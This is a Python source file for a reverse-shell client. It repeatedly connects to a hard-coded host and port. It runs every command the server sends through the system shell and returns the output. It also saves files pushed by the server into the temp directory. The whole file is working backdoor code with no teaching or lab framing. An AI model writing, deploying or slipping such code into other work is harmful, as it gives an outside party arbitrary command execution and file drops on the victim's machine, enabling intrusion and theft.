import socket
import time
import tempfile
import os
import subprocess


def connect(server_ip, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connected_once = False
    while True:
        try:
            print("Start")
            client_socket.connect((server_ip, server_port))
            connected_once = True
            print("Connected to the server.")
            receive_data(client_socket)
        except ConnectionRefusedError:
            if connected_once:
                print("Connected once. Connection lost. Retrying in 7 seconds...")
            else:
                print("Connection refused. Retrying in 7 seconds...")
                client_socket.close()
                client_socket = socket.socket(
                    socket.AF_INET, socket.SOCK_STREAM)
                time.sleep(7)
                continue
        except (BrokenPipeError, ConnectionResetError, OSError) as e:
            print(f"{type(e).__name__} Connection lost. Retrying in 7 seconds...")
            client_socket.close()
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            time.sleep(7)
            continue


def receive_file(client_socket):
    name_bytes = b''
    while True:
        chunk = client_socket.recv(1)
        if chunk == b'\n':
            break
        name_bytes += chunk
    name = name_bytes.decode()

    file_data = b''
    while True:
        chunk = client_socket.recv(4096)
        file_data += chunk
        if file_data.endswith(b"EOF"):
            print(f"Received data: {name}")
            file_data = file_data[:-3]
            break

    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, name)
    with open(file_path, "wb") as f:
        f.write(file_data)


def send_shell(client_socket, command):
    output = subprocess.run(command, shell=True,
                            capture_output=True, text=True)
    client_socket.send(output.stdout.encode('utf-8'))


def receive_data(client_socket):
    try:
        while True:
            data_rec = client_socket.recv(1024).decode()
            print(data_rec)
            flag = data_rec.split("\n")[0]

            if flag == "FILE":
                receive_file(client_socket)
            else:
                send_shell(client_socket, data_rec)
    except:
        print("An error occurred or client disconnected")


def main():
    server_ip = '192.168.0.158'
    server_port = 12345
    connect(server_ip, server_port)


if __name__ == "__main__":
    main()
